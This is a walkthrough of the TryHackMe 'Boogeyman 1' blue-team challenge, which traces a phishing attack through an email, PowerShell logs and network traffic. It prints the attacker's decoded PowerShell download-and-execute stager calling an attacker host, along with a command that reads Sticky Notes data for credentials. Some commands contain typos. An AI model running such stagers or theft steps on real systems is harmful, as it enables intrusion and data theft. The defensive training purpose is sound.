# Boogeyman 1 Walkthrough
<br/>

## Intro
Welcome to the first of the 3 series of Bogeyman challenge, here is the link to the [room](https://tryhackme.com/r/room/boogeyman1) on TryHackMe.
Here we are gonna be analyzing the Tactics, Techniques, and Procedures (TTPs) executed by a threat group from the following resouces:
- A phishing email (`dump.eml`)
- Powershell Logs from Julianne's workstation (`powershell.json`)
- Packet capture from the same workstation (`capture.pcapng`)

To achieve it we will need to use tools like:
- Wireshark / Tshark
- An email reader/client
- grep
- sed
- awk
- base64
- jq
- [LNKParse3](https://github.com/Matmaus/LnkParse3) 
- [evtx2json](https://github.com/Silv3rHorn/evtx2json)

Whenever you feel ready press "Start Machine" and in a couple of minute the Ubuntu machine should be available in split-view.

<br/>
### Story
Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.

The security team was able to flag the suspicious execution of the attachment, in addition to the phishing reports received from the other finance department employees, making it seem to be a targeted attack on the finance team. Upon checking the latest trends, the initial TTP used for the malicious attachment is attributed to the new threat group named Boogeyman, known for targeting the logistics sector.

You are tasked to analyse and assess the impact of the compromise.


Let's begin!

<br/>
<br/>

## The Challenge

### Email Analysis
Let's start with analysing the **dump.eml** file located in the artefacts directory.
The first thing we want to check are a couple of email headers to know from who and to whom the message was sent.
To view the sender:
```bash
cat dump.eml | grep "From:"
```
--> REDACTED

To check the recipient:
```bash
cat dump.eml | grep "To:"
```
Here we can see that the poor victim was Julianne, which email is ==`REDACTED@hotmail.com`==

Still looking at headers we can see that a 3rd party email relay has been used, you can see it filtering with:
```bash
grep -C 1 "DKIM-Signature" dump.eml
```
--> REDACTED

Reading down a little bit we can see that the message contains an attachment called "Invoice.zip" which is base 64 encoded.
Now let's combine a couple of commands to filter the encoded data, decode it and re-construct the zip file:
```bash
grep -A 18 "base64" dump.eml | tail -n +2 | base64 -di > Invoice.zip
```

Also don't forget to change the archive permission to extract it:
```bash
chmod +x Invoice.zip
```

We can now extract the content of the archive and see there is 1 file inside, but it's password protected:
```bash
unzip Invoice.zip
```
--> REDACTED
This format suggests use that the file is MS Windows shortcut.

We can find the password of the archive in the email message : REDACTED

Let's now parse the link file:
```bash
lnkparse Invoice_20230103.lnk
```

Viewing the file we can see that it contains a base 64 encoded payload
```bash
echo "aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==" | base64 -d
```

And we get this PowerShell code used execute a remote file:
```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

So we are now sure that the attachment is definitely not an invoice.

<br/>

### Endpoint Security
Leaving the email behind we can now focus on the analysis of PowerShell logs contained in `powershell.json`, to aid our job we can use the *jq* tool which can help us parsing JSON data.
The basic usage is:
```bash
cat FILE_NAME.json | jq OPTION VALUES
```

We can see a basic colored parsing of the whole logs with this command:
```bash
cat powershell.json | jq 
```

The first things we need to find are the domain used for file hosting and C2, let's build the command:
- we know the top-level domain "xyz" from the email, probably the same
- we can see from the previous command that the PS commands are logged in the "ScriptBlockText" field
Putting all together we get:
```bash
cat powershell.json | jq '{ScriptBlockText}' | grep "xyz"
```
--> REDACTED

The attacker download and executed a tool, let's find its name with:
```bash
cat powershell.json | jq '{ScriptBlockText}' | grep ".exe"
```
--> REDACTED

 A file accessed by the attacker using the downloaded **sq3.exe**, 
```bash
cat powershell.json | jq '{ScriptBlockText}' | grep "sq3.exe"
```
--> REDACTED

Looking at the PATH we can see that it is the saved data of a known Windows app: REDACTED .

We also know that a file was exfiltrated, so let's check which other file paths were accessed:
```bash
cat powershell.json | jq '{ScriptBlockText}' | grep "C:"
```
--> REDACTED

If you ever opted for saving your password locally with a password manager you surely recognize that this file extension is the one of ==KeePass==.

With a bit of cleaning we can output only the lines containing actual PS commands:
```bash
cat powershell.json | jq '{ScriptBlockText}' | grep -v 'Set-StrictMode -Version 1; $_\.[a-zA-Z_]*'| grep -v "null" | grep -v "{\|}" | grep -A 10 "protected_data.kdbx
```

And we see that this file gets REDACTED encoded before being exfiltrated using the REDACTED tool.

<br/>

### Network Traffic Analysis
By now we have found a phishing email, a malicious attachment containing dangerous PS commands which downloaded a file an then thanks to a commonly available tool the password database file has been exfiltrated.

Time to open the network capture with *Wireshark* and conclude the investigation.
```bash
wireshark capture.pcapng
```
 
We can start by finding out which program does the attacker has used to host the files server, we can run this filter:
```bash
http contains "payload"
```

You should get only 1 result, click on that packet and follow the HTTP traffic, there you can see the request, look at the `Server` header and we see it is REDACTED, most likely the  attacker ran a command like:
```bash
python3 -m http.server
```
To run a download http server, or to run an upload:
```bash
python3 -m uploadserver
```

This are both 2 commands we use frequently do download and upload files in CTFs.

To upload the file the attacker ran the command in PS we have seen before, resulting in an HTTP ==POST== request being sent to his server.
The attacker than used the tool to find a "different" way to transfer data thanks to the  ==DNS== protocol.

To find the password of the database we can go back at analyzing the `sq3.exe` PS command, use this filter:
```
http contains "sq3"
```

```powershell
.\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100";pwd
```

Here it takes data from the "NOTE" table.
Note ( this was `tcp.stram eq 749`) -> the data flows from the packet after that so let's now filter for:
```
tcp.stram eq 749
```

We get this block of hex encoded data:
```
92 105 100 61 ....REDACTED..... 116 13 10 13 10 13 10
```

Now we can use CyberChef, paste all this inside an choose the recipe: "From Decimal" -> "To Hexdump", you should be able to see the plain and the master password:
--> REDACTED

Finally let's reconstruct the database using *Tshark*
```bash
tshark -r capture.pcapng  -Y 'dns' -T fields -e dns.qry.name |grep ".bpakcaging.xyz" | cut -f1 -d '.'|grep -v -e "files" -e "cdn" | uniq | tr -d '\\n' > hed_data.txt
```

Now turn the hex data into the original file:
```bash
xxd -r -p hex_data.txt > password.kdbx
```

I have found that on the THM machine Keepass2 is installed, let's use it, open and unlock the database, finally copy the credit card number.
--> REDACTED

<br/>
<br/>

Congratulations you have successfully investigated the phishing event that led to sensitive data exfiltration, i hope you had fun completing the machine and following along.

Catch you again in the next challege 😊
